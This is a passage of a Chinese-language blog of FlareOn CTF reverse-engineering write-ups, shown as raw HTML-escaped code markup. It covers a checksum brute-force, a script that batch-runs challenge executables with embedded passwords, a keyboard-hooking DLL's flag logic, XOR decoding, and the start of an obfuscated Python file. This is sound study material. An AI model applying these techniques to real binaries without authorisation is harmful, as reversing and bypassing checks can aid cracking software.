        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;; v2; v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HIBYTE(v3) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)v3 ) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt; )
                v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;;
            v2 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; v6;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; {
                v5 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1;
                v3 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v5;
                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a1;
                &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v6;
            } &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v6 );
            i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HIBYTE(v5) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)v5;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (HIBYTE(i) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)i) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ((v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF00&lt;/span&gt;));
        &lt;span style=&#34;color:#75715e&#34;&gt;// if (buf == &amp;#39;f&amp;#39;) 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;//     printf(&amp;#34;%x\n&amp;#34;, ret); // 0xf51c
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// if (buf == &amp;#39;@&amp;#39;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;//     printf(&amp;#34;%x\n&amp;#34;, ret); // 0x60ee
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFB5E&lt;/span&gt;) {
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, buf);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#75715e&#34;&gt;// printf(&amp;#34;%c %x\n&amp;#34;, buf, ret);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始给的范围小了（以为会是可见字符），一直爆破不出来，反复验证了好多次，后来才发现范围是 &lt;code&gt;0-0xff&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后爆破出来是 &lt;code&gt;0xA2&lt;/code&gt;，思考了一下怎么nc传递不可见字符，然后决定直接动调改内存&lt;/p&gt;
&lt;p&gt;下断点，然后修改buf，之后看一眼SMC解密结果，发现直接给flag了，去栈里dump一下&lt;/p&gt;
&lt;h2 id=&#34;flareon5fleggo&#34;&gt;[FlareOn5]FLEGGO&lt;/h2&gt;
&lt;p&gt;看名字还以为是个go呢，结果发现是个披着re外套的misc（流汗&lt;/p&gt;
&lt;p&gt;解压后发现有一堆程序，先随便挑一个日&lt;/p&gt;
&lt;p&gt;动调发现需要输入一串字符串，刚开始还想看看是不是和base64有关，后来发现这串字符串就在exe文件中，那就直接上python整批量操作了&lt;/p&gt;
&lt;p&gt;发现password存的地址是固定的，那就用subprocess对每个exe运行一下&lt;/p&gt;
&lt;p&gt;放个脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#75715e&#34;&gt;# from pwn import *&lt;/span&gt;

files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./1JpPaUMynR9GflWbxfYvZviqiCB59RcI.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./2AljFfLleprkThTHuVvg63I7OgjG2LQT.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./3Jh0ELkck1MuRvzr8PLIpBNUGlspmGnu.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./4ihY3RWK4WYqI4XOXLtAH6XV5lkoIdgv.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./7mCysSKfiHJ4WqH2T8ERLE33Wrbp6Mqe.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./AEVYfSTJwubrlJKgxV8RAl0AdZJ5vhhy.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./BG3IDbHOUt9yHumPceLTVbObBHFneYEu.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Bl0Iv5lT6wkpVCuy7jtcva7qka8WtLYY.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Bp7836noYu71VAWc27sUdfaGwieALfc2.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./E36RGTbCE4LDtyLi97l9lSFoR7xVMKGN.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Ew93SSPDbgiQYo4E4035A16MJUxXegDW.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./HDHugJBqTJqKKVtqi3sfR4BTq6P5XLZY.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./IXITujCLucnD4P3YrXOud5gC7Bwcw6mr.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./JIdE7SESzC1aS58Wwe5j3i6XbpkCa3S6.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./JXADoHafRHDyHmcTUjEBOvqq95spU7sj.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./K7HjR3Hf10SGG7rgke9WrRfxqhaGixS0.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./MrA1JmEDfPhnTi5MNMhqVS8aaTKdxbMe.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./NaobGsJ2w6qqblcIsj4QYNIBQhg3gmTR.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./P2PxxSJpnquBQ3xCvLoYj4pD3iyQcaKj.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./PvlqINbYjAY1E4WFfc2N6rZ2nKVhNZTP.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./SDIADRKhATsagJ3K8WwaNcQ52708TyRo.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./SeDdxvPJFHCr7uoQMjwmdRBAYEelHBZB.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./aSfSVMn7B8eRtxgJgwPP5Y5HiDEidvKg.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./azcyERV8HUbXmqPTEq5JFt7Ax1W5K4wl.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./bmYBZTBJlaFNbbwpiOiiQVdzimx8QVTI.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./cWvFLbliUfJl7KFDUYF1ABBFYFb6FJMz.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./d4NlRo5umkvWhZ2FmEG32rXBNeSSLt2Q.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dT4Xze8paLOG7srCdGLsbLE1s6m3EsfX.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dnAciAGVdlovQFSJmNiPOdHjkM3Ji18o.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./eEJhUoNbuc40kLHRo8GB7bwFPkuhgaVN.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./eovBHrlDb809jf08yaAcSzcX4T37F1NI.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./gFZw7lPUlbOXBvHRc31HJI5PKwy745Wv.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./hajfdokqjogmoWfpyp4w0feoeyhs1QLo.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./iJO15JsCa1bV5anXnZ9dTC9iWbEDmdtf.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./jJHgJjbyeWTTyQqISuJMpEGgE1aFs5ZB.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kGQY35HJ7gvXzDJLWe8mabs3oKpwCo6L.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./lk0SOpnVIzTcC1Dcou9R7prKAC3laX0k.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./u3PL12jk5jCZKiVm0omvh46yK7NDfZLT.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./u8mbI3GZ8WtwruEiFkIl0UKxJS917407.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./v6RkHsLya4wTAh71C65hMXBsTc1ZhGZT.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./w3Y5YeglxqIWstp1PLbFoHvrQ9rN3F3x.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./wmkeAU8MdYrC9tEUMHH2tRMgaGdiFnga.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./x4neMBrqkYIQxDuXpwJNQZOlfyfA0eXs.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./xatgydl5cadiWFY4EXMRuoQr22ZIRC1Y.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./xyjJcvGAgswB7Yno5e9qLF4i13L1iGoT.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./y77GmQGdwVL7Fc9mMdiLJMgFQ8rgeSrl.exe&amp;#34;&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./zRx3bsMfOwG8IaayOeS8rHSSpiRfc9IB.exe&amp;#34;&lt;/span&gt;
]


&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; files:
    cur_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(f, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)
    cur_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seek(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2AB0&lt;/span&gt;)
    read_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
    password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; read_file:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            password &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# print (password)&lt;/span&gt;
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen(f, stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE, stdout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE, stderr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE, shell&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    out, err &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;communicate(password &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# print (out)&lt;/span&gt;
    pic_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out[&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;]
    char_of_pic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; out[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rename(pic_name, char_of_pic &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pic_name)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出会说每个图片对应的字符，点开图片后发现左上角有数字，应该是下标&lt;/p&gt;
&lt;p&gt;这tm就是misc啊！&lt;/p&gt;
&lt;p&gt;剩下的就是手动找位置了，屑&lt;/p&gt;
&lt;h2 id=&#34;flareon15get_it&#34;&gt;[FlareOn1]5get_it&lt;/h2&gt;
&lt;p&gt;给的是一个DLL文件（没记错的话），应该是用来钩取键盘输入的，根据不同的输入执行不同的内容，观察到有个函数为 &lt;code&gt;sub_10001240&lt;/code&gt;，执行成功就说明通过了&lt;/p&gt;
&lt;p&gt;查找引用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sub_10009AF0&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_100194FC &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
  {
    _cfltcvt_init();
    sub_10001240();
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要求让内存中一个数不为0，根据这个数再向上找&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sub_10009B60&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_1001947C &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_10019490 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_100194E0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
      {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_100194EC &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
        {
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_100194F8 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
          {
            _cfltcvt_init();
          }
          &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
          {
            dword_100194F8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            dword_100194FC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          }
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        {
          dword_100194EC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
          dword_100194F0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        }
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
      {
        dword_100194E0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        dword_100194E4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      dword_10019490 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      dword_10019494 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    dword_1001947C &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    dword_10019480 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看到最里面就是赋值为1，所以最后两位输入就是 &lt;code&gt;om&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;根据这个方法一点一点向上找引用，就能恢复出flag&lt;/p&gt;
&lt;p&gt;&lt;del&gt;不过不知道大小写是怎么判断的，网上也没查到&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;flareonstarter&#34;&gt;[FlareOn]starter&lt;/h2&gt;
&lt;p&gt;baby&lt;/p&gt;
&lt;p&gt;先执行给的程序，会自动解压出一个小程序，反编译一下，观察到&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  ReadFile(v2, byte_402158, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32u&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;NumberOfBytesWritten, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( ((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)byte_402158[v0] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; byte_402140[v0] )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; WriteFile(hFile, aYouAreSuccess, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12u&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;NumberOfBytesWritten, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;直接dump数据进行异或就行&lt;/p&gt;
&lt;h2 id=&#34;flareon2elfie&#34;&gt;[FlareOn2]elfie&lt;/h2&gt;
&lt;p&gt;这题是个python的可执行文件，能解出一个混淆过的python文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

O0OO0OO00000OOOO0OOOOO0O00O0O0O0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IRGppV0FJM3BRRlNwWGhNNG&amp;#39;&lt;/span&gt;
OO0O0O00OO00OOOOOO0O0O0OOO0OOO0O &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;UczRkNZZ0JVRHJjbnRJUWlJV3FRTkpo&amp;#39;&lt;/span&gt;
OOO0000O0OO0OOOOO000O00O0OO0O00O &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xTStNRDJqZG9nRCtSU1V&amp;#39;&lt;/span&gt;
